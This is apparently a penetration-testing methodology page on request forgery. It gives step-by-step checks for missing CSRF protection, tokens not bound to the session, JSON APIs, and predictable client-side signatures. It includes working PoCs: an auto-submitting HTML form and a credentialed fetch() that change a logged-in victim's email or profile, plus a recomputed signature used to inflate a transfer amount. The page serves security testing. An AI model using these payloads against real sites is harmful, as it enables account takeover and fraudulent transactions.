# Ability to Forge Requests

## Check List

## Methodology

### Black Box

#### Missing CSRF Protection on Sensitive Action

{% stepper %}
{% step %}
Login to your account normally
{% endstep %}

{% step %}
Intercept a sensitive request (example: email change)

```http
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com
```
{% endstep %}

{% step %}
Check whether the request contains a CSRF token, If no anti-CSRF parameter exists in body or headers, protection may be missing
{% endstep %}

{% step %}
Copy the exact request and remove the Origin and Referer headersh, Resend the request via Burp Repeater
{% endstep %}

{% step %}
If the server processes the request successfully without validating Origin/Referer, CSRF validation is absent
{% endstep %}

{% step %}
Create a malicious HTML PoC

```html
<html>
<body>
<form action="https://target.com/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@test.com">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the PoC on an external domain and open it while logged in
{% endstep %}

{% step %}
If the email is changed without user interaction or CSRF token validation, forged request is confirmed
{% endstep %}
{% endstepper %}

***

#### CSRF Token Not Bound to Session

{% stepper %}
{% step %}
Login and capture a sensitive request containing CSRF token

```http
POST /account/change-password HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

password=NewPass123&csrf=xyz987
```
{% endstep %}

{% step %}
Logout and login again to obtain a new session then Replay the old request with the old CSRF token
{% endstep %}

{% step %}
If the request succeeds with an old or reused CSRF token, token is not session-bound
{% endstep %}

{% step %}
Share the token with another authenticated account and attempt replay
{% endstep %}

{% step %}
If token works across accounts, token binding is broken
{% endstep %}

{% step %}
If reused CSRF tokens allow state-changing actions, forged request vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### JSON API Without CSRF Protection

{% stepper %}
{% step %}
Login and intercept an API request

```http
POST /api/profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"phone":"9999999999"}
```
{% endstep %}

{% step %}
Verify absence of CSRF token in headers or body
{% endstep %}

{% step %}
Create malicious JavaScript PoC

```js
<script>
fetch("https://target.com/api/profile/update",{
  method:"POST",
  credentials:"include",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({"phone":"9999999999"})
});
</script>
```
{% endstep %}

{% step %}
Host the PoC externally and open it while authenticated
{% endstep %}

{% step %}
If the API updates the profile without CSRF validation, forged JSON request is confirmed
{% endstep %}
{% endstepper %}

***

#### Predictable Request Signature

{% stepper %}
{% step %}
Intercept a signed request

```http
POST /api/transfer HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token
Content-Type: application/json

{"amount":100,"to":"user2","signature":"b64hash"}
```
{% endstep %}

{% step %}
Inspect client-side JavaScript for signature generation
{% endstep %}

{% step %}
Identify weak logic (signature = Base64(amount + to))
{% endstep %}

{% step %}
Modify amount value

```json
{"amount":10000,"to":"user2","signature":"new_b64hash"}
```
{% endstep %}

{% step %}
Recalculate signature using same weak logic then Send modified request
{% endstep %}

{% step %}
If server accepts manipulated signed request, signature validation is predictable
{% endstep %}

{% step %}
If sensitive transaction can be modified by recomputing client-side signature, forged request vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
